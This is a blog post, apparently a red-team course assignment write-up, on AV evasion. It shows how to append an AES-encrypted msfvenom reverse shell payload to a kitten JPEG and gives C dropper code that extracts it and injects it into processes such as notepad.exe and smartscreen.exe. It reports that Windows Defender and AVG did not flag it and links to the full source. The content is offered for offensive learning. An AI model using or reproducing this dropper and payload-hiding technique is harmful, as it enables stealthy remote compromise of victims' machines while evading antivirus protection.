---
layout: single
title: AV Evasion - The payload is behind kitties
date: 2020-09-22
classes: wide
header:
  teaser: /assets/images/AV_evasion/kittens.jpg
tags:
  - Pentester
  - Windows
  - Reverse shell
  - AV Evasion
  - Kitties
--- 
![](/assets/images/AV_evasion/kittens.jpg)<br>

## Introduction
Hello and welcome back to the 2nd assignment of the well done course on Malware Development by [Sektor7](https://institute.sektor7.net/red-team-operator-malware-development-essentials), in the previous [blog post](https://blackcloud.me/av-evasion-1/) we saw PE injection using a payload saved as a favicon.ico file, with all the functions and payload encrypted with AES. The next assignment is to hide the payload inside an image and implement the dropper with the capacity of extraction of the payload and injecting it in the PE process target.

## The Assignment
Let's start taking our last dropper and check what we have and what we must change.<br>
The most of the code is working pretty well as we saw, but the payload extraction has to be changed because now reenz0h asked to hide the payload inside an image and extract it before injecting in the victim process, so take a look closer to the payload memory loading and analyze what we have to change.

## the Payload
First of all we need to choose how hide our payload behind an image and most important how we want to extract it before using it. <br>
The hint in the assignemt page says we can use file concatenation. So we choosed this way to work (a big thank you to reenz0h for the help):
- Take a kitties image from internet (who doesn't love kitties? :))
- Create the payload with msfvenom
-- in this case I choosed a simple reverse tcp windows x64 shell
- Encrypt the payload with AES
- Append the encrypted payload at the end of the image 
- Append the original lenght of image as last bytes in the image

Once we downloaded the kitties image from internet we can check last 11 rows of the hexadecimal values of the image with ```xxd```
```bash
xxd -g1 U.jpg |  tail -11 
00330990: 81 f1 c0 8a b8 e5 e3 18 00 0e 13 62 25 25 3c 4d  ...........b%%<M
003309a0: f6 02 dc e7 98 fc 6f f6 62 59 5f c2 31 93 3c e2  ......o.bY_.1.<.
003309b0: 85 80 12 07 53 ba 85 c9 20 fe 97 e3 7c 0d c0 03  ....S... ...|...
003309c0: 96 d0 65 4f 89 a7 aa 78 21 2a 0a 58 29 2a b1 1a  ..eO...x!*.X)*..
003309d0: 6f 73 6c 08 53 2d e1 95 45 55 3c d3 4a 9f 09 0b  osl.S-..EU<.J...
003309e0: 1a 46 a3 cc 08 bf 37 bb 17 14 98 c8 38 9e eb 48  .F....7.....8..H
003309f0: 6a 94 92 4e a5 ac 8e 53 74 82 6d f6 fc 7c b0 51  j..N...St.m..|.Q
00330a00: 44 77 c8 1a 70 d2 57 c8 90 db 7a b4 bc 06 d6 e6  Dw..p.W...z.....
00330a10: 4a f5 95 03 ea ed 6e 1f 8e 08 a9 8f 2f 24 b6 f3  J.....n...../$..
00330a20: 7a 65 63 ae a5 cb ea 59 17 d1 60 b4 f3 a9 44 6e  zec....Y..`...Dn
00330a30: 3a e2 56 ce 6c e3 76 41 16 d0 cf ff d9           :.V.l.vA.....
```
Now after the encryption of the payload we can use a copy of the original image (is usefull to work on a copy just in case something doesn't work as exepected, you don't have to download the image everytime) and append the encrypted paylaod to the image with the ```cat``` command

```bash
cat payload_enc >> kittens.jpg
```
Now check the tail of the image compared with the encrypted payload to see if everithing is loaded correctly
![](/assets/images/AV_evasion/hex_compare.png)
As we can see after the hex values ``ff d9`` (that's in the end of every jpg file) we have our encrypted payload. <br>
After that we have to append the value of the size of the original image, in this case 3344957 bytes 

```bash
echo "3344957" >> kittens.jpg
```
Check again the last hex values of the manipulated jpg
![](/assets/images/AV_evasion/hex_compare2.png)<br>
Great! our devil jpg is ready. Now we have to modify our dropper to extract the payload from the image in our victim machine 

## the Dropper
Let's change the name of the payload as a recource by the file ```resources.rc``` to ```kittens.jpg```
```
#include "resources.h"

IMAGE RCDATA kittens.jpg
```
The dropper has a section where the payload is loaded as a resource with the ```FindResourceA``` and ```LoadResource``` functions, its lenght is calculated with ```SizeofResource``` then it is loaded in memory with the ```VirtualAlloc``` function

```
...
// Extract payload from resources section
    res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    resHandle = pLoadResource(NULL, res);
    payload = (char *) pLockResource(resHandle);
    payload_len = pSizeofResource(NULL, res);

// Allocate some memory buffer for payload
    exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
...
```
In the code trunk below the Windows functions are called as pointers because of AES encryption as saw in the previous post, this techniques works very well as an AV evasion technique so we can reuse it. Now we have to change this section like this

```
// Extract payload from the image
    image = (char*)pLockResource(resHandle); // lock the resource and point to the first char of the jpg
    image_len = SizeofResource(NULL, res); // get the size of the jpg + payload + last 7 bytes 
    
    end = image + image_len - 7; // jump to the end of the jpg and read the last 7 bytes that are the original size of the jpg without payload
    size = atoi(end); // cast from char to int, now size is the original size of the jpg
    offset = image + size; // offset points to the first char of the p0
    payload_len = image_len - size - 7; // calculate the payload size
    memcpy(payload, offset, payload_len); // copy in another memory area the effective payload 
    
// Allocate some memory buffer for payload
    exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```
Long story short, instead of charging the payload from a separated file we need to:
- get the size of the devil image, 
- jump at the end of the devil image and read the last 7 bytes that are the size of the orginal image
- now we can calculate the offset from the original image and the devil image, this difference is the payload
- now we need to calculate the payload lenght
- use memcpy to load the payload in memory and use it as a resource

## Tests
As in the previous post we tested the dropper on different process: ```explorer.exe```, ```notepad.exe``` and ```smartscreen.exe``` but in this case all the 3 processes inject doesn't trigger Windows Defender nor AVG Free, however the ```explorer.exe``` injecton causes a reload of the process in the case you exit the shell on the attacking machine and this is very loud. On the other hand nothing appens when we try to inject the ```notepad.exe```, AVG scan the dropper and let it execute the reverse shell payload maintaining the shell active also when we close Notepad and the ```notepad.exe``` process is destroyed, same story if we try to inject the ```smartscreen.exe``` process, another reverse shell session is opened without any alarm from AVG.
So we are following the TOON rule (Two is One and One is None) also in this case.  

![](/assets/images/AV_evasion/AVG_image_bypass.gif)<br>

and [here](https://github.com/bolonobolo/av_evasion/tree/master/PE_Injection/Behind%20image%20Dropper/implant.cpp) you can find the dropper code. <br>
In the next post we'll try to complete another point of the assignment ```hide the encrypted payload behind an image```.

## References
Malware Dev Essentials Course
- [Sektor7](https://institute.sektor7.net/red-team-operator-malware-development-essentials)
- [reenz0h](https://twitter.com/Sektor7Net) <br>
